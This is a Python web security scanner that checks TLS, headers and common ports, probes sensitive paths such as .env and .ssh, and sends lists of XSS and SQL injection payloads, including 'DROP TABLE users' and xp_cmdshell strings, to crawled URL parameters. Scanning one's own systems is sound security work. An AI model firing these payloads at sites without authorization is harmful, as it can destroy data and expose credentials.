import argparse
import requests
import socket
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, parse_qs, urlparse
import ssl
import logging
from datetime import datetime
import json
import re
from bs4 import BeautifulSoup
import hashlib
import xml.etree.ElementTree as ET

class VulnerabilityTester:
    """Class dedicated to specific vulnerability testing"""
    
    def __init__(self, timeout=10):
        self.timeout = timeout
        
    def test_xss(self, url, params):
        """Basic reflected XSS test"""
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '{{7*7}}',
            '${7*7}',
            '<iframe src="javascript:alert(1)"></iframe>',
            '"><iframe src="javascript:alert(1)"></iframe>',
            '<svg onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '"><svg onload=alert(1)>',
            '"><svg><script>alert(1)</script></svg>',
            '<body onload=alert(1)>',
            '"><body onload=alert(1)>',
            '<img src="javascript:alert(\'XSS\')">',
            '"><img src="javascript:alert(\'XSS\')">',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            '"><link rel="stylesheet" href="javascript:alert(1)">',
            '<style>@import "javascript:alert(1)";</style>',
            '"><style>@import "javascript:alert(1)";</style>',
            '<object data="javascript:alert(1)"></object>',
            '"><object data="javascript:alert(1)"></object>',
            '<embed src="javascript:alert(1)">',
            '"><embed src="javascript:alert(1)">',
            '<bgsound src="javascript:alert(1)">',
            '"><bgsound src="javascript:alert(1)">',
            '<base href="javascript:alert(1)//">',
            '"><base href="javascript:alert(1)//">',
            '<form><button formaction="javascript:alert(1)">X</button></form>',
            '"><form><button formaction="javascript:alert(1)">X</button></form>',
            '<input type="image" src="javascript:alert(1)">',
            '"><input type="image" src="javascript:alert(1)">'
        ]
        
        vulnerabilities = []
        
        for param in params:
            for payload in payloads:
                try:
                    params[param] = payload
                    r = requests.get(url, params=params, timeout=self.timeout)
                    if payload in r.text:
                        vulnerabilities.append({
                            'type': 'Potential XSS',
                            'param': param,
                            'payload': payload,
                            'url': url
                        })
                except Exception as e:
                    logging.error(f"Error during XSS test: {str(e)}")
                    
        return vulnerabilities

    def test_sqli(self, url, params):
        """Basic SQL injection test"""
        payloads = [
            "' OR '1'='1",
            "1' OR '1'='1",
            "1 UNION SELECT NULL--",
            "1' UNION SELECT NULL--",
            "1) UNION SELECT NULL--",
            "' OR '1'='1' --",
            "1' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1' /*",
            "' OR 'x'='x",
            "1' OR 'x'='x",
            "' OR 1=1--",
            "1' OR 1=1--",
            "' OR 1=1#",
            "1' OR 1=1#",
            "' OR 1=1/*",
            "1' OR 1=1/*",
            "' OR 'a'='a",
            "1' OR 'a'='a",
            "') OR ('a'='a",
            "' OR ''='",
            "1' OR ''='",
            "' OR 1=1 LIMIT 1 OFFSET 1--",
            "1' OR 1=1 LIMIT 1 OFFSET 1--",
            "1; DROP TABLE users--",
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' OR '1'='1' AND 'a'='a",
            "1' OR '1'='1' AND 'a'='a"
        ]
        
        vulnerabilities = []
        original_response = None
        
        try:
            original_response = requests.get(url, params=params, timeout=self.timeout)
        except Exception:
            return vulnerabilities
            
        for param in params:
            original_length = len(original_response.text)
            for payload in payloads:
                try:
                    modified_params = params.copy()
                    modified_params[param] = payload
                    r = requests.get(url, params=modified_params, timeout=self.timeout)
                    
                    if abs(len(r.text) - original_length) > 50 or r.status_code != original_response.status_code:
                        vulnerabilities.append({
                            'type': 'Potential SQLi',
                            'param': param,
                            'payload': payload,
                            'url': url
                        })
                except Exception as e:
                    logging.error(f"Error during SQLi test: {str(e)}")
                    
        return vulnerabilities

class SecurityScanner:
    def __init__(self, target, threads=5, timeout=10, depth=2):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.depth = depth
        self.visited_urls = set()
        self.vulns = []
        self.vulnerability_tester = VulnerabilityTester(timeout)
        self.setup_logging()

    def setup_logging(self):
        log_filename = f'scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        logging.basicConfig(
            filename=log_filename,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        logging.getLogger().addHandler(console_handler)

    def check_ssl(self):
        """Check SSL/TLS configuration"""
        try:
            hostname = self.target.split("://")[-1].split("/")[0]
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    logging.info(f"Valid SSL certificate for {hostname}")
                    return True, cert
        except Exception as e:
            logging.error(f"SSL Error: {str(e)}")
            return False, str(e)

    def check_headers(self):
        """Analyze security headers"""
        try:
            r = requests.head(self.target, timeout=self.timeout)
            security_headers = {
                'Strict-Transport-Security': 'HSTS not configured',
                'X-Frame-Options': 'Missing clickjacking protection',
                'X-Content-Type-Options': 'Missing MIME sniffing protection',
                'Content-Security-Policy': 'CSP not configured',
                'X-XSS-Protection': 'Missing XSS protection',
                'Referrer-Policy': 'Referrer policy not configured',
                'Permissions-Policy': 'Permissions policy not configured',
                'Expect-CT': 'Expect-CT not configured',
                'Feature-Policy': 'Feature policy not configured',
                'Cache-Control': 'Cache control not configured',
                'Pragma': 'Pragma directive not configured',
                'Expires': 'Expires directive not configured',
                'Access-Control-Allow-Origin': 'CORS not configured'
            }
            
            missing_headers = []
            for header, message in security_headers.items():
                if header not in r.headers:
                    missing_headers.append(message)
                    logging.warning(f"Missing header: {header}")
            
            return missing_headers
        except Exception as e:
            logging.error(f"Error checking headers: {str(e)}")
            return [str(e)]

    def check_open_ports(self, host):
        """Scan common ports"""
        common_ports = [
            21,    # FTP
            22,    # SSH
            23,    # Telnet
            25,    # SMTP
            53,    # DNS
            80,    # HTTP
            110,   # POP3
            143,   # IMAP
            443,   # HTTPS
            445,   # Microsoft DS
            993,   # IMAPS
            995,   # POP3S
            1433,  # Microsoft SQL Server
            1521,  # Oracle Database
            2049,  # NFS
            3306,  # MySQL
            3389,  # RDP
            5432,  # PostgreSQL
            5900,  # VNC
            5984,  # CouchDB
            6379,  # Redis
            8080,  # HTTP Alternative
            8443,  # HTTPS Alternative
            9200,  # Elasticsearch
            11211, # Memcached
            27017, # MongoDB
            5000,  # Flask Development Server
            8000,  # Django Development Server
            1883,  # MQTT
            8883,  # MQTT over TLS/SSL
            6667,  # IRC
            25565, # Minecraft Server
        ]
        open_ports = []
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            try:
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                    logging.info(f"Found open port: {port}")
            except Exception as e:
                logging.error(f"Error scanning port {port}: {str(e)}")
            finally:
                sock.close()
            
        return open_ports

    def check_common_vulnerabilities(self):
        """Check common web vulnerabilities"""
        common_paths = [
            '/admin', '/phpinfo.php', '/test.php', '/.git',
            '/.env', '/wp-config.php', '/config.php',
            '/robots.txt', '/.htaccess', '/server-status',
            '/backup', '/backups', '/db_backup', '/database_backup',
            '/temp', '/tmp', '/logs', '/log', '/error_log',
            '/debug', '/debug.log', '/.DS_Store', '/.idea',
            '/.vscode', '/.svn', '/.hg', '/.bzr',
            '/.htpasswd', '/cgi-bin/', '/cgi-bin/test.cgi',
            '/cgi-bin/php.cgi', '/phpmyadmin', '/adminer', 
            '/shell', '/cmd', '/upload', '/uploads', 
            '/file', '/files', '/sql', '/db', 
            '/database', '/dump', '/dumps', '/webdav', 
            '/.well-known', '/.aws', '/.docker', 
            '/.kube', '/.ssh', '/.bash_history', '/.bashrc', 
            '/.profile', '/.zshrc', '/.zsh_history'
        ]
        
        found_paths = []
        for path in common_paths:
            try:
                url = urljoin(self.target, path)
                r = requests.get(url, timeout=self.timeout, allow_redirects=False)
                if r.status_code != 404:
                    found_paths.append((path, r.status_code))
                    logging.warning(f"Found sensitive path: {path} - Status: {r.status_code}")
            except Exception as e:
                logging.error(f"Error testing path {path}: {str(e)}")
                continue
                
        return found_paths

    def crawl_site(self, url, depth=0):
        """Crawler to discover site URLs"""
        if depth >= self.depth or url in self.visited_urls:
            return set()
            
        self.visited_urls.add(url)
        new_urls = set()
        
        try:
            r = requests.get(url, timeout=self.timeout, verify=False)  # Added verify=False for self-signed certificates
            soup = BeautifulSoup(r.text, 'html.parser')
            
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    absolute_url = urljoin(url, href)
                    if absolute_url.startswith(self.target):
                        new_urls.add(absolute_url)
                        
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                if action:
                    absolute_url = urljoin(url, action)
                    if absolute_url.startswith(self.target):
                        new_urls.add(absolute_url)
                        
            for new_url in new_urls:
                if new_url not in self.visited_urls:
                    self.crawl_site(new_url, depth + 1)
                    
        except Exception as e:
            logging.error(f"Error crawling {url}: {str(e)}")
            
        return new_urls

    def test_url_vulnerabilities(self, url):
        """Test vulnerabilities on a specific URL"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if params:
            xss_vulns = self.vulnerability_tester.test_xss(url, params)
            if xss_vulns:
                self.vulns.extend(xss_vulns)
                
            sqli_vulns = self.vulnerability_tester.test_sqli(url, params)
            if sqli_vulns:
                self.vulns.extend(sqli_vulns)

    def generate_report(self, results):
        """Generate detailed HTML report"""
        report = f"""
        <html>
        <head>
            <title>Security Report - {self.target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .section {{ margin: 20px 0; padding: 10px; border: 1px solid #ddd; }}
                .vulnerability {{ color: red; }}
                .info {{ color: blue; }}
            </style>
        </head>
        <body>
            <h1>Security Report</h1>
            <div class="section">
                <h2>General Information</h2>
                <p>Target: {results['target']}</p>
                <p>Scan Date: {results['timestamp']}</p>
            </div>
            
            <div class="section">
                <h2>SSL Configuration</h2>
                <p>Status: {'Valid' if results['ssl_check'][0] else 'Invalid'}</p>
                <p>Details: {results['ssl_check'][1]}</p>
            </div>
            
            <div class="section">
                <h2>Missing Security Headers</h2>
                <ul>
                    {''.join(f'<li>{header}</li>' for header in results['missing_headers'])}
                </ul>
            </div>
            
            <div class="section">
                <h2>Open Ports</h2>
                <p>{', '.join(map(str, results['open_ports']))}</p>
            </div>
            
            <div class="section">
                <h2>Vulnerable URLs</h2>
                <ul>
                    {''.join(f'<li>{path[0]} (Status: {path[1]})</li>' for path in results['vulnerable_paths'])}
                </ul>
            </div>
            
            <div class="section">
                <h2>Detected Vulnerabilities</h2>
                <ul>
                    {''.join(f'<li class="vulnerability">{vuln["type"]} - {vuln["url"]} (Parameter: {vuln["param"]})</li>' for vuln in self.vulns)}
                </ul>
            </div>
        </body>
        </html>
        """
        
        report_filename = f'security_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html'
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report)
        return report_filename

    def run_scan(self):
        """Run complete scan"""
        logging.info(f"Starting scan for {self.target}")
        
        # Initial scan
        results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'ssl_check': self.check_ssl(),
            'missing_headers': self.check_headers(),
            'open_ports': self.check_open_ports(self.target.split("://")[-1].split("/")[0]),
            'vulnerable_paths': self.check_common_vulnerabilities()
        }
        
        # Crawl and test vulnerabilities
        discovered_urls = self.crawl_site(self.target)
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.test_url_vulnerabilities, discovered_urls)
        
        # Generate report
        report_filename = self.generate_report(results)
        
        logging.info(f"Scan completed. Report generated: {report_filename}")
        return results

def main():
    parser = argparse.ArgumentParser(description='Advanced Ethical Web Security Scanner')
    parser.add_argument('target', help='Target URL or IP')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds')
    parser.add_argument('--depth', type=int, default=2, help='Maximum crawl depth')
    
    args = parser.parse_args()
    
    requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
    
    scanner = SecurityScanner(args.target, args.threads, args.timeout, args.depth)
    results = scanner.run_scan()
    
    print("\n=== Security Scan Summary ===")
    print(f"A detailed report has been generated in security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")

if __name__ == "__main__":
    main()